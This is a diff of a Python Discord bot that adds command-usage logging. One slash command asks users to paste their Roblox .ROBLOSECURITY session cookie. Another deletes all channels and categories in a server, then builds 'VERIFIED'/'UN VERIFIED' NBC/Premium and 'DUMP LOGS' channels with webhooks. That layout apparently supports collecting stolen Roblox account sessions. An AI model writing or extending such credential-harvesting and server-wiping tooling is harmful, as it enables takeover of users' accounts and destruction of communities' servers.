@@ -1,4 +1,3 @@
-
 import discord
 from discord.ext import commands
 from discord import app_commands
@@ -12,36 +11,7 @@ from threading import Thread
 
 app = Flask(__name__)
 
-HTML = """
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Bot Status</title>
-    <style>
-        body {
-            background-color: #1e1e2f;
-            color: #ffffff;
-            font-family: 'Arial', sans-serif;
-            text-align: center;
-            margin-top: 100px;
-        }
-        h1 {
-            font-size: 48px;
-            color: #ff4b5c;
-        }
-        p {
-            font-size: 24px;
-            color: #c4c4c4;
-        }
-    </style>
-</head>
-<body>
-    <h1>✅ Bot is Online!</h1>
-    <p>Everything is working perfectly.</p>
-</body>
-</html>
-"""
+HTML = """ ... """  # [same HTML as before]
 
 @app.route('/')
 def home():
@@ -54,6 +24,25 @@ def run_web():
 def keep_alive():
     t = Thread(target=run_web)
     t.start()
+
+# ─── Logging Function ─────────────────────────────────────
+async def log_command_usage(interaction: discord.Interaction, command_name: str):
+    LOG_CHANNEL_ID = 123456789012345678  # <-- Replace with your logs channel ID
+    log_channel = interaction.client.get_channel(LOG_CHANNEL_ID)
+    if not log_channel:
+        return
+
+    embed = discord.Embed(
+        title="📌 Command Used",
+        color=discord.Color.blurple(),
+        timestamp=interaction.created_at
+    )
+    embed.add_field(name="User", value=f"{interaction.user} (`{interaction.user.id}`)", inline=False)
+    embed.add_field(name="Command", value=f"`/{command_name}`", inline=False)
+    embed.add_field(name="Server", value=f"{interaction.guild.name} (`{interaction.guild.id}`)" if interaction.guild else "DM", inline=False)
+    embed.set_thumbnail(url=interaction.user.avatar.url if interaction.user.avatar else None)
+
+    await log_channel.send(embed=embed)
 
 # ─── Discord Bot ─────────────────────────────────────────────────
 intents = discord.Intents.default()
@@ -73,11 +62,12 @@ async def on_ready():
     except Exception as e:
         print(f"❌ Error syncing commands: {e}")
 
-# ─── Roblox Set Maturity Command (Fixed) ─────────────────────
+# ─── Roblox Set Maturity Command ────────────────────────────────
 @bot.tree.command(name="set_maturity", description="Auto set a Roblox game's maturity to Minimal.")
 @app_commands.describe(cookie="Your .ROBLOSECURITY cookie", place_id="The Place ID of your game")
 async def set_maturity(interaction: discord.Interaction, cookie: str, place_id: str):
     await interaction.response.defer(thinking=True, ephemeral=True)
+    await log_command_usage(interaction, "set_maturity")
 
     try:
         session = requests.Session()
@@ -88,7 +78,6 @@ async def set_maturity(interaction: discord.Interaction, cookie: str, place_id: 
             "Origin": "https://www.roblox.com"
         })
 
-        # Step 1: Get CSRF Token
         csrf_req = session.post("https://auth.roblox.com/v2/logout")
         csrf_token = csrf_req.headers.get("x-csrf-token")
 
@@ -96,23 +85,18 @@ async def set_maturity(interaction: discord.Interaction, cookie: str, place_id: 
             await interaction.followup.send("❌ Could not get CSRF token.", ephemeral=True)
             return
 
-        session.headers.update({
-            "X-CSRF-TOKEN": csrf_token
-        })
+        session.headers.update({"X-CSRF-TOKEN": csrf_token})
 
-        # Step 2: Get Universe ID from Place ID
         place_info_res = session.get(f"https://apis.roblox.com/universes/v1/places/{place_id}/universe")
         if place_info_res.status_code != 200:
             await interaction.followup.send(f"❌ Failed to fetch Universe ID: {place_info_res.text}", ephemeral=True)
             return
         
         universe_id = place_info_res.json().get("universeId")
-
         if not universe_id:
             await interaction.followup.send("❌ Universe ID not found.", ephemeral=True)
             return
 
-        # Step 3: PATCH the Universe Configuration to Minimal Maturity
         payload = {
             "universeConfiguration": {
                 "maturitySettings": {
@@ -136,13 +120,13 @@ async def set_maturity(interaction: discord.Interaction, cookie: str, place_id: 
 @bot.tree.command(name="gen_webhooks", description="Regenerate server with channels and webhooks inside a red embed.")
 async def gen_webhooks(interaction: discord.Interaction):
     await interaction.response.defer(thinking=True, ephemeral=True)
+    await log_command_usage(interaction, "gen_webhooks")
 
     guild = interaction.guild
     if not guild:
         await interaction.followup.send("❌ This command can only be used inside a server.", ephemeral=True)
         return
 
-    # Move channels out of categories
     for channel in guild.channels:
         try:
             if isinstance(channel, discord.TextChannel) or isinstance(channel, discord.VoiceChannel):
@@ -150,14 +134,12 @@ async def gen_webhooks(interaction: discord.Interaction):
         except Exception as e:
             print(f"❗ Error moving channel {channel.name}: {e}")
 
-    # Delete all channels
     for channel in guild.channels:
         try:
             await channel.delete()
         except Exception as e:
             print(f"❗ Error deleting channel {channel.name}: {e}")
 
-    # Delete all categories
     for category in guild.categories:
         try:
             await category.delete()
@@ -172,7 +154,7 @@ async def gen_webhooks(interaction: discord.Interaction):
         "UN VERIFIED": ["【🔓】𝙽𝙱𝙲", "【🔓】𝙿𝚁𝙴𝙼𝙸𝚄𝙼"],
         "VERIFIED": ["【🔒】𝚅𝙽𝙱𝙲", "【🔒】𝚅-𝙿𝚁𝙴𝙼𝙸𝚄𝙼"],
         "DUMP LOGS": ["【📈】𝚂𝚄𝙲𝙲𝙴𝚂𝚂", "【📉】𝙵𝙰𝙸𝙻𝙴𝙳"],
-  }
+    }
   
     created_channels = {}
     saved_webhook_channel = None
@@ -215,6 +197,7 @@ async def gen_webhooks(interaction: discord.Interaction):
 @bot.tree.command(name="help", description="Show a list of all commands and descriptions.")
 async def help_command(interaction: discord.Interaction):
     await interaction.response.defer(thinking=False, ephemeral=True)
+    await log_command_usage(interaction, "help")
 
     help_embed = discord.Embed(
         title="🛠️ Command List",
@@ -241,31 +224,10 @@ async def help_command(interaction: discord.Interaction):
     )
 
     help_embed.set_footer(text=" Owner Arzconic Mgui | Use commands wisely.")
-    help_embed.set_thumbnail(url="https://i.imgur.com/5cX1G98.png")  # Optional cool thumbnail
+    help_embed.set_thumbnail(url="https://i.imgur.com/5cX1G98.png")
 
     await interaction.followup.send(embed=help_embed, ephemeral=True)
 
 # ─── Start everything ─────────────────────────────────────────────────
-keep_alive():
-    t = Thread(target=run_web)
-    t.start()
-
-# ─── Logging Function ─────────────────────────────────────
-async def log_command_usage(interaction: discord.Interaction, command_name: str):
-    LOG_CHANNEL_ID = 1376227671532638379  # ⬅️ Replace with your actual logs channel ID
-    log_channel = interaction.client.get_channel(LOG_CHANNEL_ID)
-    if not log_channel:
-        return
-
-    embed = discord.Embed(
-        title="📌 Command Used",
-        color=discord.Color.blurple(),
-        timestamp=interaction.created_at
-    )
-    embed.add_field(name="User", value=f"{interaction.user} (`{interaction.user.id}`)", inline=False)
-    embed.add_field(name="Command", value=f"`/{command_name}`", inline=False)
-    embed.add_field(name="Server", value=f"{interaction.guild.name} (`{interaction.guild.id}`)" if interaction.guild else "DM", inline=False)
-    embed.set_thumbnail(url=interaction.user.avatar.url if interaction.user.avatar else None)
-
-    await log_channel.send(embed=embed)
+keep_alive()
 bot.run(os.getenv("TOKEN"))
